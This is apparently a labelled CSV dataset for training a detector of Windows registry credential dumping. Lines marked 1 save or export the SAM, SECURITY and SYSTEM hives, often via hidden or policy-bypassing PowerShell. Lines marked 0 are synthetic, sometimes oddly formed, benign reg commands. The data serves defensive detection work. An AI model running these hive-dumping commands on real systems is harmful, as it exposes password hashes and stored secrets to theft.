text,label
cmd.exe /c reg   save  hklm\security  \\localhost\c$\__dump\sam.bak   /y,1
cmd.exe /c reg.exe save   hklm\system   c:\windows\temp\sam.save /y,1
"cmd /c powershell -c ""reg  save hklm\sam %temp%\sec_backup.dat""",1
pwsh -noprofile -c reg.exe export  hkey_local_machine\security   c:\temp\system.hive,1
"powershell -c reg.exe  save  ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey28""  ""%temp%\non_sensitive.hive""",0
"reg   unload   ""hku\environment""   /v version",0
"powershell -c reg delete ""hkey_current_user\software\google\chrome\subkey45""",0
"cmd /c reg.exe unload ""hkcu\software\google\chrome\subkey21"" /v version",0
pwsh -noprofile -c reg  export  hkey_local_machine\security  c:\users\public\registry_export.reg,1
cmd.exe /c reg export hkey_local_machine\sam  %temp%\sec_backup.dat   /y,1
"cmd /c reg.exe  copy  ""hkey_local_machine\software\classes\subkey19""  ""hkey_local_machine\hkey_local_machine\software\wow6432node_672""",0
"reg   query   ""hkey_users\hkey_local_machine\software\wow6432node""   /f",0
"powershell -c reg.exe  compare  ""hku\environment\subkey39""  ""hku\software\google\chrome_852""",0
"powershell -c reg.exe   query   ""hkey_current_user\software\microsoft\windows\currentversion""   /v path",0
"reg   add   ""hkcu\software\classes""   /f   /t reg_dword",0
cmd.exe /c start /b reg.exe   export   hklm\system  \\localhost\c$\__dump\sam.bak /y,1
cmd.exe /c start /b reg.exe export   hklm\system   c:\windows\temp\sam.save,1
"reg.exe   copy   ""hku\software\google\chrome""   ""hku\system\currentcontrolset\services_218""",0
"reg.exe unload ""hkcu\software\google\chrome\subkey13""",0
pwsh -noprofile -c reg.exe save  hkey_local_machine\system  c:\users\public\registry_export.reg  /y,1
c:\windows\system32\cmd.exe /k reg  export   hkey_local_machine\system  c:\users\public\registry_export.reg,1
"reg save ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey90"" ""d:\backup\registry_hive.dat""",0
pwsh -noprofile -c reg save  hkey_local_machine\system   \\localhost\c$\__dump\sam.bak  /y,1
c:\windows\system32\cmd.exe /k reg.exe  save  hkey_local_machine\system c:\windows\temp\sam.save,1
"reg.exe add ""hku\software\classes\subkey15"" /f /t reg_sz /d ""1.0.0""",0
"reg.exe   compare   ""hkey_users\software\classes\subkey16""   ""hkey_users\hkey_local_machine\software\policies\microsoft_456""",0
reg.exe  export hklm\sam   \\localhost\c$\__dump\sam.bak,1
pwsh -noprofile -c reg.exe  export   hkey_local_machine\system  c:\windows\temp\sam.save /y,1
"reg.exe   copy   ""hkcu\hkey_local_machine\system\currentcontrolset\control\subkey87""   ""hkcu\software\myapp\settings_513""",0
reg.exe   save   hkey_local_machine\system  %temp%\sec_backup.dat  /y,1
"reg.exe copy ""hkey_current_user\software\google\chrome"" ""hkey_current_user\hkey_local_machine\software\wow6432node_802""",0
"reg.exe  add  ""hkcu\software\google\chrome""    /t reg_sz",0
"reg  add  ""hkey_local_machine\control panel\desktop""  /f    /d 1",0
cmd.exe /c start /b reg export  hkey_local_machine\sam %temp%\sec_backup.dat,1
c:\windows\system32\cmd.exe /k reg   export hkey_local_machine\security   c:\windows\temp\sam.save  /y,1
pwsh -noprofile -c reg.exe  save  hkey_local_machine\system   %temp%\sec_backup.dat  /y,1
powershell -exec bypass -w hidden -c reg.exe save   hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
"cmd /c powershell -c ""reg   export hklm\sam  c:\users\public\registry_export.reg""",1
powershell -exec bypass -w hidden -c reg.exe   save  hklm\sam   %temp%\sec_backup.dat   /y,1
"reg.exe  copy  ""hkey_current_user\software\policies\mycorp\subkey9""  ""hkey_current_user\software\classes_863""",0
"cmd /c powershell -c ""reg  save  hklm\sam \.\c$ackup.reg  /y""",1
"reg.exe save ""hku\system\currentcontrolset\services"" ""c:\windows\temp\software_dump.dat""",0
"reg   query   ""hkey_current_user\hkey_local_machine\software\policies\microsoft\subkey57""   /v path",0
"powershell -c reg  copy  ""hkcu\software\policies\mycorp\subkey96""  ""hkcu\environment_823""",0
c:\windows\system32\cmd.exe /k reg.exe export  hklm\security \\localhost\c$\__dump\sam.bak,1
c:\windows\system32\cmd.exe /k reg.exe save hklm\sam \\localhost\c$\__dump\sam.bak,1
pwsh -noprofile -c reg save  hkey_local_machine\system  \.\c$ackup.reg /y,1
powershell -exec bypass -w hidden -c reg.exe  save  hkey_local_machine\sam  c:\temp\system.hive,1
"cmd /c reg.exe   query   ""hkey_current_user\software\policies\mycorp\subkey33""   /f",0
"reg.exe delete ""hkcu\software\policies\mycorp\subkey15"" /v lastupdate",0
powershell -command reg save  hklm\sam  c:\users\public\registry_export.reg,1
"reg.exe add ""hkcu\system\currentcontrolset\services"" /v version /t reg_dword /d ""1.0.0""",0
powershell -command reg save hkey_local_machine\sam   c:\windows\temp\sam.save,1
"reg  unload  ""hkey_local_machine\system\currentcontrolset\services\subkey94""",0
powershell -command reg export  hkey_local_machine\sam   c:\windows\temp\sam.save /y,1
"reg  save  ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey23""  ""c:\temp\user_settings.reg""",0
pwsh -noprofile -c reg.exe export hkey_local_machine\sam  c:\users\public\registry_export.reg,1
powershell -exec bypass -w hidden -c reg  export  hklm\security   c:\temp\system.hive  /y,1
"cmd /c reg   delete   ""hkcu\hkey_local_machine\software\wow6432node""   /f",0
pwsh -noprofile -c reg   export  hklm\sam c:\windows\temp\sam.save  /y,1
cmd.exe /c reg.exe save  hklm\security  c:\windows\temp\sam.save   /y,1
cmd.exe /c start /b reg export  hkey_local_machine\sam   %temp%\sec_backup.dat  /y,1
"reg compare ""hkey_users\hkey_local_machine\software\policies\microsoft\subkey53"" ""hkey_users\environment_363""",0
"cmd /c powershell -c ""reg.exe  save  hkey_local_machine\sam   c:\windows\temp\sam.save  /y""",1
cmd.exe /c start /b reg save   hklm\system c:\temp\system.hive,1
"reg.exe restore ""hkey_local_machine\hkey_local_machine\software\policies\microsoft"" ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control_934""",0
"start /b reg   restore   ""hkey_users\hkey_local_machine\software\policies\microsoft""   ""hkey_users\environment_477""",0
powershell -exec bypass -w hidden -c reg  export  hkey_local_machine\sam c:\users\public\registry_export.reg,1
reg.exe export hklm\system   \.\c$ackup.reg  /y,1
"cmd /c reg delete ""hku\hkey_local_machine\system\currentcontrolset\control"" /v path",0
"reg  delete  ""hkcu\hkey_local_machine\software\policies\microsoft\subkey39""  /f",0
"reg copy ""hkey_local_machine\environment\subkey67"" ""hkey_local_machine\hkey_local_machine\software\policies\microsoft_534""",0
"cmd /c powershell -c ""reg export   hkey_local_machine\security  \\localhost\c$\__dump\sam.bak  /y""",1
cmd.exe /c reg  save  hklm\security \\localhost\c$\__dump\sam.bak,1
reg.exe   save   hkey_local_machine\system  c:\temp\system.hive /y,1
"reg restore ""hkey_current_user\system\currentcontrolset\services\subkey99"" ""hkey_current_user\software\google\chrome_448""",0
powershell -exec bypass -w hidden -c reg   export hklm\security  \.\c$ackup.reg,1
powershell -command reg.exe export   hkey_local_machine\security  c:\temp\system.hive,1
"reg   delete   ""hku\hkey_local_machine\system\currentcontrolset\control\subkey33""",0
pwsh -noprofile -c reg   save hkey_local_machine\security   \.\c$ackup.reg,1
"reg.exe   add   ""hku\software\microsoft\windows\currentversion\subkey85""   /v version   /t reg_sz",0
powershell -exec bypass -w hidden -c reg save   hkey_local_machine\sam   c:\temp\system.hive,1
"reg  unload  ""hkey_current_user\hkey_local_machine\software\wow6432node""  /v lastupdate",0
"cmd /c reg compare ""hkcu\hkey_local_machine\software\wow6432node\subkey59"" ""hkcu\hkey_local_machine\software\policies\microsoft_776""",0
"start /b reg query ""hkey_current_user\software\myapp\settings"" /f",0
cmd.exe /c start /b reg  export hklm\security   c:\users\public\registry_export.reg,1
"reg save ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey63"" ""%temp%\non_sensitive.hive"" /y",0
"start /b reg.exe  restore  ""hkey_users\software\microsoft\windows\currentversion\subkey36""  ""hkey_users\software\policies\mycorp_641""",0
"reg.exe  copy  ""hkey_local_machine\software\classes""  ""hkey_local_machine\software\google\chrome_405""",0
"reg  copy  ""hkcu\hkey_local_machine\system\currentcontrolset\control""  ""hkcu\hkey_local_machine\system\currentcontrolset\control_103""",0
"reg.exe   save   ""hkey_local_machine\hkey_local_machine\software\wow6432node""   ""c:\users\public\chrome_data.bak""   /y",0
"cmd /c powershell -c ""reg.exe   save  hkey_local_machine\sam   c:\windows\temp\sam.save   /y""",1
c:\windows\system32\cmd.exe /k reg.exe export hkey_local_machine\security   c:\users\public\registry_export.reg,1
pwsh -noprofile -c reg.exe  save hkey_local_machine\sam   c:\users\public\registry_export.reg,1
reg.exe   export   hkey_local_machine\sam %temp%\sec_backup.dat,1
"reg.exe delete ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control"" /v path",0
reg export  hkey_local_machine\system  \.\c$ackup.reg,1
powershell -exec bypass -w hidden -c reg export  hkey_local_machine\system  c:\windows\temp\sam.save,1
"reg   delete   ""hkey_current_user\system\currentcontrolset\services""   /v path",0
cmd.exe /c reg export   hklm\system c:\users\public\registry_export.reg  /y,1
"reg  delete  ""hkey_users\control panel\desktop""  /v lastupdate",0
"reg unload ""hkey_users\environment\subkey76"" /v path",0
"cmd /c reg.exe unload ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey4"" /v path",0
"reg   restore   ""hku\environment\subkey79""   ""hku\software\policies\mycorp_115""",0
cmd.exe /c start /b reg.exe export hklm\system \.\c$ackup.reg,1
pwsh -noprofile -c reg.exe   export hklm\system \.\c$ackup.reg,1
powershell -exec bypass -w hidden -c reg.exe save hklm\security  c:\windows\temp\sam.save,1
powershell -command reg.exe save   hkey_local_machine\system c:\windows\temp\sam.save,1
"reg  restore  ""hkey_current_user\environment\subkey25""  ""hkey_current_user\software\microsoft\windows\currentversion_968""",0
"powershell -c reg  unload  ""hkey_local_machine\software\policies\mycorp""  /f",0
cmd.exe /c reg.exe export hklm\system   c:\temp\system.hive /y,1
"reg   copy   ""hkcu\environment""   ""hkcu\hkey_local_machine\system\currentcontrolset\control_822""",0
"cmd /c powershell -c ""reg   save hkey_local_machine\security  c:\temp\system.hive   /y""",1
powershell -exec bypass -w hidden -c reg.exe  save   hklm\sam c:\users\public\registry_export.reg   /y,1
"start /b reg   copy   ""hkey_local_machine\control panel\desktop\subkey32""   ""hkey_local_machine\hkey_local_machine\software\wow6432node_555""",0
"reg.exe query ""hkey_users\control panel\desktop\subkey34"" /v path",0
c:\windows\system32\cmd.exe /k reg.exe save  hklm\system \.\c$ackup.reg,1
"reg  unload  ""hkcu\hkey_local_machine\software\wow6432node\subkey78""  /v lastupdate",0
"cmd /c powershell -c ""reg.exe  export  hklm\security  \.\c$ackup.reg /y""",1
"reg.exe  compare  ""hku\software\microsoft\windows\currentversion""  ""hku\control panel\desktop_361""",0
"reg.exe delete ""hkey_users\hkey_local_machine\software\wow6432node"" /f",0
"reg.exe  save  ""hku\system\currentcontrolset\services\subkey81""  ""d:\backup\registry_hive.dat""",0
"start /b reg copy ""hku\software\microsoft\windows\currentversion"" ""hku\software\policies\mycorp_151""",0
"powershell -c reg.exe  query  ""hku\software\policies\mycorp""",0
c:\windows\system32\cmd.exe /k reg  save  hkey_local_machine\system   c:\temp\system.hive  /y,1
pwsh -noprofile -c reg.exe save  hklm\sam   c:\users\public\registry_export.reg,1
pwsh -noprofile -c reg   export hklm\system \.\c$ackup.reg,1
powershell -exec bypass -w hidden -c reg   save hkey_local_machine\security  \\localhost\c$\__dump\sam.bak,1
powershell -exec bypass -w hidden -c reg export  hkey_local_machine\system  c:\users\public\registry_export.reg   /y,1
"start /b reg query ""hkey_users\control panel\desktop\subkey36"" /v path",0
"powershell -c reg.exe  query  ""hku\hkey_local_machine\software\policies\microsoft""  /f",0
"reg.exe  query  ""hkcu\control panel\desktop\subkey87""  /f",0
cmd.exe /c reg.exe save  hkey_local_machine\security   c:\windows\temp\sam.save /y,1
"reg.exe   unload   ""hku\environment""   /f",0
"start /b reg  save  ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey15""  ""c:\users\public\chrome_data.bak""  /y",0
"reg.exe   compare   ""hkcu\software\policies\mycorp\subkey37""   ""hkcu\control panel\desktop_703""",0
"reg.exe unload ""hkey_local_machine\environment\subkey48"" /f",0
"cmd /c reg  unload  ""hku\software\microsoft\windows\currentversion\subkey20""  /f",0
reg save   hkey_local_machine\system   c:\temp\system.hive   /y,1
reg save HKEY_LOCAL_MACHINE\SOFTWARE C:\temp\software_full.reg,0
"reg.exe   save   ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey37""   ""d:\backup\registry_hive.dat""   /y",0
netsh firewall set opmode enable,0
"reg.exe  delete  ""hkey_local_machine\software\google\chrome""  /f",0
"reg.exe restore ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control"" ""hkey_current_user\software\classes_746""",0
reg.exe  export  hklm\sam   c:\temp\system.hive  /y,1
powershell -exec bypass -w hidden -c reg.exe  export hkey_local_machine\sam \.\c$ackup.reg,1
"start /b reg.exe  save  ""hkey_current_user\software\policies\mycorp\subkey63""  ""d:\backup\registry_hive.dat""  /y",0
c:\windows\system32\cmd.exe /k reg.exe export   hkey_local_machine\system  c:\windows\temp\sam.save  /y,1
"powershell -c reg   copy   ""hkey_current_user\software\classes\subkey94""   ""hkey_current_user\hkey_local_machine\software\wow6432node_112""",0
powershell -exec bypass -w hidden -c reg   export hkey_local_machine\sam c:\windows\temp\sam.save,1
pwsh -noprofile -c reg.exe  export hklm\security %temp%\sec_backup.dat,1
"reg  unload  ""hku\software\microsoft\windows\currentversion""  /v path",0
cmd.exe /c start /b reg  save  hklm\security   %temp%\sec_backup.dat  /y,1
c:\windows\system32\cmd.exe /k reg.exe   save  hkey_local_machine\system c:\temp\system.hive  /y,1
"cmd /c reg.exe   add   ""hkey_current_user\software\myapp\settings""   /v path   /t reg_sz",0
powershell -command reg.exe save  hklm\system  \.\c$ackup.reg   /y,1
"reg.exe  save  ""hkey_users\environment""  ""c:\temp\user_settings.reg""  /y",0
"cmd /c powershell -c ""reg export hklm\system   %temp%\sec_backup.dat /y""",1
"reg.exe compare ""hkey_current_user\system\currentcontrolset\services"" ""hkey_current_user\hkey_local_machine\software\policies\microsoft_175""",0
powershell -exec bypass -w hidden -c reg save  hkey_local_machine\sam %temp%\sec_backup.dat,1
c:\windows\system32\cmd.exe /k reg  save   hklm\system  \.\c$ackup.reg  /y,1
"reg.exe unload ""hkey_local_machine\control panel\desktop"" /v lastupdate",0
"reg.exe   add   ""hku\hkey_local_machine\software\policies\microsoft\subkey48""   /v version   /t reg_sz",0
"reg.exe add ""hkey_local_machine\software\myapp\settings"" /f  /d ""c:\program files\app""",0
"powershell -c reg.exe  copy  ""hkey_users\software\google\chrome\subkey52""  ""hkey_users\software\myapp\settings_552""",0
reg.exe   save  hklm\system   c:\temp\system.hive /y,1
reg  export  hklm\security \.\c$ackup.reg,1
"cmd /c powershell -c ""reg  save  hkey_local_machine\system c:\windows\temp\sam.save""",1
reg  save  hkey_local_machine\sam  c:\users\public\registry_export.reg  /y,1
reg   export  hklm\system   c:\temp\system.hive,1
pwsh -noprofile -c reg   save  hklm\security   c:\temp\system.hive   /y,1
"powershell -c reg.exe   compare   ""hku\software\myapp\settings\subkey35""   ""hku\control panel\desktop_890""",0
"powershell -c reg.exe   compare   ""hkey_current_user\software\microsoft\windows\currentversion\subkey51""   ""hkey_current_user\software\myapp\settings_637""",0
"cmd /c reg  restore  ""hkey_local_machine\control panel\desktop""  ""hkey_local_machine\hkey_local_machine\software\policies\microsoft_718""",0
c:\windows\system32\cmd.exe /k reg.exe  export  hklm\security  c:\temp\system.hive   /y,1
reg.exe  export  hkey_local_machine\security   %temp%\sec_backup.dat  /y,1
reg.exe save   hklm\sam   %temp%\sec_backup.dat  /y,1
reg  save hklm\security %temp%\sec_backup.dat /y,1
"reg   compare   ""hkey_current_user\software\policies\mycorp\subkey28""   ""hkey_current_user\hkey_local_machine\software\policies\microsoft_804""",0
powershell -command reg  save  hkey_local_machine\system  c:\windows\temp\sam.save,1
c:\windows\system32\cmd.exe /k reg.exe save  hklm\sam c:\windows\temp\sam.save,1
powershell -exec bypass -w hidden -c reg.exe   export hklm\security c:\temp\system.hive  /y,1
cmd.exe /c reg   export   hkey_local_machine\security c:\windows\temp\sam.save  /y,1
"start /b reg query ""hkey_users\environment"" /v path",0
powershell -command reg   export   hklm\security  c:\temp\system.hive /y,1
"reg.exe query ""hkey_users\software\classes\subkey99"" /f",0
cmd.exe /c start /b reg  export hkey_local_machine\sam \.\c$ackup.reg  /y,1
cmd.exe /c reg.exe   export hklm\system \\localhost\c$\__dump\sam.bak  /y,1
"cmd /c reg   unload   ""hkey_local_machine\control panel\desktop\subkey42""   /f",0
reg.exe   export  hklm\system c:\temp\system.hive,1
"powershell -c reg.exe add ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control"" /v path  /d ""1.0.0""",0
"reg.exe add ""hkey_local_machine\software\classes"" /v version /t reg_dword",0
cmd.exe /c reg  save hklm\security   \.\c$ackup.reg /y,1
"reg.exe unload ""hkcu\system\currentcontrolset\services\subkey2"" /f",0
"reg.exe  restore  ""hkey_users\software\myapp\settings\subkey16""  ""hkey_users\hkey_local_machine\system\currentcontrolset\control_226""",0
cmd.exe /c reg.exe save   hkey_local_machine\sam %temp%\sec_backup.dat,1
cmd.exe /c reg save  hkey_local_machine\security  \\localhost\c$\__dump\sam.bak   /y,1
c:\windows\system32\cmd.exe /k reg  save hklm\sam   c:\temp\system.hive   /y,1
"cmd /c reg  save  ""hkcu\software\policies\mycorp\subkey76""  ""c:\users\public\chrome_data.bak""",0
"start /b reg.exe query ""hkcu\software\classes\subkey57"" /v lastupdate",0
"cmd /c powershell -c ""reg  export hkey_local_machine\security   c:\temp\system.hive""",1
"reg.exe  compare  ""hku\software\policies\mycorp""  ""hku\software\classes_769""",0
"reg.exe  add  ""hkey_local_machine\software\classes""  /v lastupdate  /t reg_dword  /d ""1.0.0""",0
reg.exe  export   hkey_local_machine\sam   %temp%\sec_backup.dat,1
pwsh -noprofile -c reg.exe export hklm\security   c:\windows\temp\sam.save   /y,1
powershell -exec bypass -w hidden -c reg.exe   save   hkey_local_machine\system  c:\users\public\registry_export.reg  /y,1
"reg   restore   ""hkey_local_machine\software\policies\mycorp\subkey13""   ""hkey_local_machine\control panel\desktop_837""",0
"powershell -c reg  copy  ""hkey_current_user\software\myapp\settings\subkey12""  ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control_605""",0
"start /b reg   unload   ""hku\software\google\chrome\subkey39""",0
"reg.exe   unload   ""hkey_current_user\software\google\chrome\subkey15""   /v path",0
powershell -exec bypass -w hidden -c reg.exe export hkey_local_machine\security c:\temp\system.hive,1
powershell -exec bypass -w hidden -c reg.exe export  hklm\system   \.\c$ackup.reg,1
"reg.exe delete ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey90"" /v path",0
cmd.exe /c reg save  hklm\sam %temp%\sec_backup.dat /y,1
"reg   add   ""hkey_current_user\software\policies\mycorp\subkey4""   /v lastupdate   /t reg_sz",0
powershell -command reg export  hkey_local_machine\security  c:\windows\temp\sam.save,1
powershell -exec bypass -w hidden -c reg export  hklm\system   c:\users\public\registry_export.reg /y,1
powershell -command reg  export hkey_local_machine\security   c:\temp\system.hive  /y,1
pwsh -noprofile -c reg.exe export  hkey_local_machine\sam \.\c$ackup.reg,1
cmd.exe /c reg save hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
"reg.exe  compare  ""hku\system\currentcontrolset\services\subkey9""  ""hku\software\myapp\settings_601""",0
cmd.exe /c start /b reg.exe save  hklm\sam c:\users\public\registry_export.reg,1
cmd.exe /c reg   save   hklm\security   c:\users\public\registry_export.reg,1
"reg.exe   unload   ""hkey_users\software\myapp\settings\subkey45""   /v path",0
cmd.exe /c start /b reg   save  hkey_local_machine\sam   c:\windows\temp\sam.save /y,1
reg.exe  save hkey_local_machine\sam c:\windows\temp\sam.save,1
"powershell -c reg compare ""hku\hkey_local_machine\system\currentcontrolset\control\subkey53"" ""hku\hkey_local_machine\software\policies\microsoft_771""",0
pwsh -noprofile -c reg.exe save hkey_local_machine\security   c:\windows\temp\sam.save  /y,1
c:\windows\system32\cmd.exe /k reg   export hkey_local_machine\security   \.\c$ackup.reg /y,1
"reg   save   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey36""   ""c:\windows\temp\software_dump.dat""   /y",0
c:\windows\system32\cmd.exe /k reg export   hkey_local_machine\security   c:\users\public\registry_export.reg,1
cmd.exe /c start /b reg   export hklm\sam   \.\c$ackup.reg   /y,1
"reg.exe   restore   ""hkcu\software\microsoft\windows\currentversion""   ""hkcu\software\myapp\settings_567""",0
"reg.exe add ""hkcu\software\google\chrome"" /v version /t reg_dword",0
"cmd /c reg delete ""hkcu\software\classes"" /v path",0
"reg.exe restore ""hku\software\classes"" ""hku\control panel\desktop_238""",0
powershell -exec bypass -w hidden -c reg.exe save  hklm\system  \.\c$ackup.reg,1
reg.exe  save  hklm\sam   c:\windows\temp\sam.save,1
"reg.exe   restore   ""hkcu\software\policies\mycorp""   ""hkcu\software\google\chrome_992""",0
"reg.exe   unload   ""hkey_local_machine\control panel\desktop""   /v version",0
"reg.exe delete ""hku\hkey_local_machine\software\policies\microsoft\subkey97"" /v version",0
"start /b reg.exe save ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control"" ""c:\temp\user_settings.reg"" /y",0
"cmd /c powershell -c ""reg.exe save   hklm\system   \\localhost\c$\__dump\sam.bak""",1
powershell -command reg save  hklm\sam  %temp%\sec_backup.dat,1
pwsh -noprofile -c reg.exe  save   hklm\system   \\localhost\c$\__dump\sam.bak,1
cmd.exe /c reg.exe  save hklm\security   c:\users\public\registry_export.reg,1
"reg restore ""hkcu\system\currentcontrolset\services"" ""hkcu\hkey_local_machine\system\currentcontrolset\control_661""",0
"reg.exe query ""hkey_users\environment"" /v version",0
"reg.exe  delete  ""hkcu\software\policies\mycorp\subkey6""  /f",0
"reg   query   ""hkcu\software\classes""   /v version",0
"reg  compare  ""hkcu\control panel\desktop""  ""hkcu\software\policies\mycorp_231""",0
"reg  compare  ""hkey_local_machine\control panel\desktop""  ""hkey_local_machine\software\google\chrome_416""",0
cmd.exe /c reg.exe  export   hklm\system  c:\users\public\registry_export.reg,1
"cmd /c powershell -c ""reg export  hklm\sam  c:\temp\system.hive  /y""",1
"reg.exe unload ""hku\hkey_local_machine\software\policies\microsoft\subkey13"" /v lastupdate",0
"reg query ""hkey_current_user\control panel\desktop\subkey11"" /v version",0
cmd.exe /c reg  export  hkey_local_machine\sam   c:\users\public\registry_export.reg /y,1
"cmd /c powershell -c ""reg  export  hklm\security c:\temp\system.hive  /y""",1
"cmd /c powershell -c ""reg.exe   export   hklm\system  %temp%\sec_backup.dat""",1
powershell -command reg   save hkey_local_machine\security c:\windows\temp\sam.save,1
"reg.exe   copy   ""hkey_current_user\software\google\chrome""   ""hkey_current_user\software\microsoft\windows\currentversion_251""",0
cmd.exe /c reg   export hklm\sam   c:\windows\temp\sam.save,1
pwsh -noprofile -c reg  save  hkey_local_machine\security c:\temp\system.hive  /y,1
"cmd /c reg.exe  save  ""hkey_users\hkey_local_machine\software\policies\microsoft""  ""c:\users\public\chrome_data.bak""  /y",0
"reg.exe restore ""hkcu\software\microsoft\windows\currentversion"" ""hkcu\software\myapp\settings_922""",0
powershell -command reg   save  hklm\system   c:\users\public\registry_export.reg  /y,1
"reg.exe  unload  ""hkey_local_machine\software\google\chrome\subkey69""  /v version",0
"reg.exe unload ""hkey_local_machine\software\classes\subkey93"" /v path",0
"cmd /c powershell -c ""reg.exe   export hkey_local_machine\security c:\users\public\registry_export.reg""",1
reg export   hklm\sam \\localhost\c$\__dump\sam.bak   /y,1
"cmd /c reg.exe  copy  ""hkey_local_machine\software\policies\mycorp""  ""hkey_local_machine\software\myapp\settings_501""",0
"reg   query   ""hkcu\control panel\desktop""   /v version",0
powershell -command reg.exe save hkey_local_machine\sam c:\users\public\registry_export.reg   /y,1
powershell -command reg.exe  export   hklm\sam  \.\c$ackup.reg,1
reg save,0
"cmd /c powershell -c ""reg.exe save hkey_local_machine\system  \\localhost\c$\__dump\sam.bak   /y""",1
"reg.exe restore ""hkcu\software\policies\mycorp"" ""hkcu\hkey_local_machine\software\policies\microsoft_962""",0
cmd.exe /c start /b reg   save  hklm\system  \\localhost\c$\__dump\sam.bak  /y,1
"reg.exe  add  ""hkcu\hkey_local_machine\software\policies\microsoft""  /v lastupdate  /t reg_dword",0
"cmd /c powershell -c ""reg  export hkey_local_machine\sam c:\temp\system.hive  /y""",1
"cmd /c reg.exe add ""hkcu\hkey_local_machine\software\policies\microsoft""  /t reg_dword /d ""c:\program files\app""",0
reg.exe  export   hkey_local_machine\security  c:\users\public\registry_export.reg   /y,1
c:\windows\system32\cmd.exe /k reg.exe export  hkey_local_machine\security  c:\windows\temp\sam.save  /y,1
cmd.exe /c reg export hkey_local_machine\system c:\temp\system.hive /y,1
"cmd /c reg.exe  add  ""hkcu\hkey_local_machine\software\wow6432node""  /v version  /t reg_sz",0
"cmd /c powershell -c ""reg   save   hkey_local_machine\system  \\localhost\c$\__dump\sam.bak   /y""",1
"reg.exe   add   ""hkcu\software\classes\subkey90""         /d ""c:\program files\app""",0
cmd.exe /c reg  save   hklm\sam c:\windows\temp\sam.save   /y,1
"cmd /c powershell -c ""reg  save  hklm\system   c:\windows\temp\sam.save""",1
powershell -command reg export   hkey_local_machine\system  \\localhost\c$\__dump\sam.bak,1
cmd.exe /c reg   save hklm\sam c:\windows\temp\sam.save /y,1
powershell -command reg.exe save hklm\sam \.\c$ackup.reg,1
"powershell -c reg.exe  compare  ""hkey_users\software\microsoft\windows\currentversion""  ""hkey_users\control panel\desktop_703""",0
"powershell -c reg.exe unload ""hku\control panel\desktop\subkey86"" /v version",0
"reg save ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control"" ""c:\users\public\chrome_data.bak"" /y",0
"reg  unload  ""hkey_users\hkey_local_machine\software\policies\microsoft""  /v lastupdate",0
reg.exe save hklm\sam   \\localhost\c$\__dump\sam.bak  /y,1
"cmd /c powershell -c ""reg.exe save hkey_local_machine\system %temp%\sec_backup.dat /y""",1
"reg.exe   restore   ""hkey_users\system\currentcontrolset\services\subkey27""   ""hkey_users\software\classes_329""",0
"reg   restore   ""hkey_users\software\google\chrome""   ""hkey_users\software\google\chrome_437""",0
powershell -exec bypass -w hidden -c reg.exe   export  hklm\security c:\temp\system.hive /y,1
"cmd /c reg.exe  unload  ""hkey_current_user\software\google\chrome\subkey91""  /v version",0
